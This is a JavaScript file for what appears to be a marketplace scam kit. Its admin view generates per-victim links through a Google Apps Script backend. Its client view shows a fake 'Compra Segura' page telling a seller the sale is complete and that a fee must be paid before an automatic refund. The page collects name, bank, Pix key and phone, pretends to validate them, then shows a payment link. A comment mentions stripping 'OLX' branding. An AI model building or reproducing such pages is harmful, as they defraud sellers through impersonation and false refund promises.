// ========================================================
// ⚙️ CONFIGURAÇÃO CENTRAL
// ========================================================
const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
const BASE_URL = window.location.href.split('?')[0]; // Detecta a URL base automaticamente

// ========================================================
// 🚦 ROTEADOR PRINCIPAL (Lógica Zero-Bug)
// ========================================================
document.addEventListener('DOMContentLoaded', () => {
  const params = new URLSearchParams(window.location.search);
  const adminView = document.getElementById('admin-view');
  const clientView = document.getElementById('client-view');

  if (params.has('id')) {
    // ROTA: CLIENTE
    console.log("Inicializando Modo Cliente...");
    adminView.style.display = 'none';
    clientView.style.display = 'block';
    initClientApp(params.get('id'));
  } else {
    // ROTA: ADMIN
    console.log("Inicializando Modo Admin...");
    adminView.style.display = 'block';
    clientView.style.display = 'none';
    initAdminApp();
  }
});

// ========================================================
// 🏢 LÓGICA ADMIN (Gerador)
// ========================================================
function initAdminApp() {
  const form = document.getElementById('adminForm');
  const modal = document.getElementById('modalSuccess');
  const linkDisplay = document.getElementById('finalLink');
  const btnSalvar = document.getElementById('btnSalvar');
  const btnCopy = document.getElementById('btnCopy');
  const btnView = document.getElementById('btnView');
  const inputLinkPagamento = document.getElementById('linkPagamento');
  const toggleHeader = document.getElementById('preset-toggle');
  const fieldsContainer = document.getElementById('preset-fields-container');
  const toggleIcon = document.getElementById('toggle-icon');
  const moneyInputs = document.querySelectorAll('.money');

  // Toggle Preset Fields
  toggleHeader.addEventListener('click', () => {
      const isExpanded = fieldsContainer.classList.toggle('expanded');
      toggleIcon.classList.toggle('rotated');
      fieldsContainer.style.maxHeight = isExpanded ? fieldsContainer.scrollHeight + "px" : "0";
  });

  // Máscara Moeda
  const formatMoney = (value) => {
    value = value.replace(/\D/g, "");
    const amount = parseFloat(value) / 100;
    return isNaN(amount) ? "" : amount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };
  
  moneyInputs.forEach(input => {
    input.addEventListener('input', (e) => e.target.value = formatMoney(e.target.value));
    if(input.value) {
      const cleanVal = input.value.replace(/\D/g, "");
      if(cleanVal) input.value = formatMoney(cleanVal);
    }
  });

  // Carregar Último Link
  (async () => {
    inputLinkPagamento.disabled = true;
    try {
      const res = await fetch(`${BACKEND_URL}?action=lastLink`);
      const json = await res.json();
      if(json.status === 'success' && json.result) {
        inputLinkPagamento.value = json.result;
      } else {
        inputLinkPagamento.placeholder = "Insira o link manualmente";
      }
    } catch(e) {
      console.error("Erro lastLink", e);
    } finally {
      inputLinkPagamento.disabled = false;
    }
  })();

  // Enviar Formulário
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    btnSalvar.textContent = "Processando...";
    btnSalvar.disabled = true;

    const data = {};
    new FormData(form).forEach((v, k) => data[k] = v);
    data.linkPagamento = inputLinkPagamento.value; 

    try {
      const res = await fetch(BACKEND_URL, {
        method: 'POST',
        redirect: 'follow', 
        headers: { 'Content-Type': 'text/plain;charset=utf-8' },
        body: JSON.stringify(data)
      });

      const json = await res.json();

      if (json.status === 'success') {
        const idGerado = json.savedId || json.id; 
        if (!idGerado) throw new Error("ID não retornado.");

        // GERAÇÃO DO LINK (Usa a mesma URL base + ID)
        const linkPronto = `${BASE_URL}?id=${idGerado}`;

        linkDisplay.textContent = linkPronto;
        btnView.href = linkPronto; 
        modal.classList.add('active');
      } else {
        alert('Erro: ' + json.message);
      }
    } catch (err) {
      alert('Erro de conexão: ' + err.message);
    } finally {
      btnSalvar.textContent = "Gerar Link do Cliente";
      btnSalvar.disabled = false;
    }
  });

  // Botão Copiar
  btnCopy.addEventListener('click', () => {
    navigator.clipboard.writeText(linkDisplay.textContent);
    const originalHTML = btnCopy.innerHTML;
    btnCopy.innerHTML = `<i class="fa-solid fa-check"></i> Copiado!`;
    btnCopy.style.background = "#4CAF50";
    setTimeout(() => {
      btnCopy.innerHTML = originalHTML;
      btnCopy.style.background = "#fff";
    }, 2000);
  });
}

// ========================================================
// 🛍️ LÓGICA CLIENTE (Visualizador)
// ========================================================
async function initClientApp(id) {
  const containerArea = document.getElementById('client-content-area');

  const formatValueForClient = (value) => {
      if (!value) return ''; 
      let valueStr = String(value).trim();
      valueStr = valueStr.replace(/R\$\s*/g, '');
      if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) return valueStr;
      let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.');
      let number = parseFloat(numericStr);
      return !isNaN(number) ? number.toLocaleString('pt-BR', { minimumFractionDigits: 2 }) : valueStr;
  }

  const getDisplayValue = (data, isCurrency, defaultText) => {
      const formatted = formatValueForClient(data);
      if (formatted === '') return isCurrency ? `R$ ${defaultText}` : defaultText;
      if (isCurrency && (formatted.toLowerCase().includes('grátis') || formatted.toLowerCase().includes('inclusa'))) return formatted;
      return isCurrency ? `R$ ${formatted}` : formatted;
  }

  const renderError = (msg) => {
    containerArea.innerHTML = `
      <div class="client-container" style="text-align:center; padding:40px;">
        <h2 style="color:#ff4d4d;">Atenção</h2>
        <p style="color:#ccc;">${msg}</p>
      </div>`;
  }

  const criarElemento = (tag, attrs = {}, inner = '') => {
    const el = document.createElement(tag);
    Object.entries(attrs).forEach(([key, value]) => {
      if (key === 'class') el.className = value;
      else if (key === 'id') el.id = value;
      else if (key === 'href') el.href = value;
      else el.setAttribute(key, value);
    });
    if (typeof inner === 'string') el.innerHTML = inner;
    else if (inner instanceof Node) el.appendChild(inner);
    return el;
  }

  try {
    const response = await fetch(`${BACKEND_URL}?id=${id}`);
    const json = await response.json();

    if (json.status !== 'success') {
      renderError(json.message || 'Pedido não encontrado.');
      return;
    }

    const dadosBrutos = json.data;
    const dados = {};
    Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);

    // Aliases para compatibilidade e remoção de "OLX"
    dados.valor = dados.valor || dados['valor total'] || '';
    dados.taxa = dados.taxa || dados['taxa de serviço'] || '';
    dados.frete = dados.frete || dados['custo frete'] || '';
    dados.tarifa = dados.tarifa || dados['tarifa plataforma'] || dados['tarifa olx pay'] || ''; // Fallback seguro
    dados.linkpagamento = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';

    // Renderização
    containerArea.innerHTML = '';
    
    const container = criarElemento('div', { class: 'client-container' });
    const imgHeader = criarElemento('div', { class: 'header-image' });
    const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); // REBRANDING
    const content = criarElemento('div', { class: 'content' });

    const prazo = dados.prazo || '15 minutos';
    const linkFinal = dados.linkpagamento;

    content.innerHTML = `
      <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
      <p>Após o pagamento da taxa de <span class="highlight">${getDisplayValue(dados.taxa, true, '---')}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
      
      <h2>Detalhes da transação</h2>
      <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
      <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>${getDisplayValue(dados.valor, true, '---')}</span></p>
      <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${getDisplayValue(dados.frete, true, 'Grátis')}</span></p>
      <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa de Serviço:</strong> <span>${getDisplayValue(dados.tarifa, true, 'Inclusa')}</span></p>
      ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
      ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação via:</strong> <span>${dados.cartao}</span></p>` : ''}

      <div style="margin-top:15px">
        ${dados.vendas ? `<span class="badge">${dados.vendas}</span>` : ''}
        ${dados.atendimento ? `<span class="badge">${dados.atendimento}</span>` : ''}
        ${dados.entrega ? `<span class="badge">${dados.entrega}</span>` : ''}
      </div>

      <h2>💬 Próximos passos</h2>
      <ul>
        <li>Preencha o formulário abaixo com seus dados bancários para recebimento.</li>
        <li>Após enviar, o botão de pagamento da taxa será liberado.</li>
      </ul>
    `;

    // Form Cliente
    const form = criarElemento('form', { id: 'dadosCliente' });
    ['nome', 'banco', 'pix', 'telefone'].forEach(campo => {
      const label = criarElemento('label', { for: campo }, campo.charAt(0).toUpperCase() + campo.slice(1));
      const input = criarElemento('input', { type: 'text', id: campo, name: campo, required: true });
      form.append(label, input);
    });

    const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Confirmar Dados para Recebimento');
    const msgEnvio = criarElemento('p', { id: 'msgEnvio' });
    form.append(btnEnviar, msgEnvio);
    content.appendChild(form);

    // Loader
    const loaderDiv = criarElemento('div', { id: 'loader-intermedio' });
    loaderDiv.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i><p>Gerando link seguro...</p>`;
    content.appendChild(loaderDiv);

    // Botão Pagamento
    const btnPagamento = criarElemento('a', { id: 'btn-pagamento', class: 'button-pay hidden', href: linkFinal }, 'Seguir para a liberação');
    const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
    content.appendChild(btnContainer);

    container.append(imgHeader, title, content);
    container.appendChild(criarElemento('div', { class: 'footer' }, '&copy; 2025 Plataforma Segura. Todos os direitos reservados.'));
    containerArea.appendChild(container);

    // Lógica de Envio
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      btnEnviar.innerHTML = `<div style="display:flex;justify-content:center;gap:10px"><i class="fa-solid fa-circle-notch fa-spin"></i> Validando...</div>`;
      btnEnviar.disabled = true;
      btnEnviar.style.background = "#555";

      setTimeout(() => {
        msgEnvio.textContent = "✅ Dados validados! Pagamento liberado.";
        msgEnvio.style.color = "#00bfa5";
        form.style.display = 'none';
        loaderDiv.style.display = 'block';

        // Animação de transição
        btnPagamento.classList.remove('hidden');
        btnPagamento.classList.add('visible');
        
        const endAnimation = (evt) => {
           if (evt.propertyName === 'opacity' || evt.propertyName === 'transform') {
             loaderDiv.style.display = 'none';
             btnPagamento.removeEventListener('transitionend', endAnimation);
           }
        };
        btnPagamento.addEventListener('transitionend', endAnimation);
        btnContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 1500);
    });

  } catch (err) {
    console.error(err);
    renderError('Erro de conexão. Verifique sua internet.');
  }
}
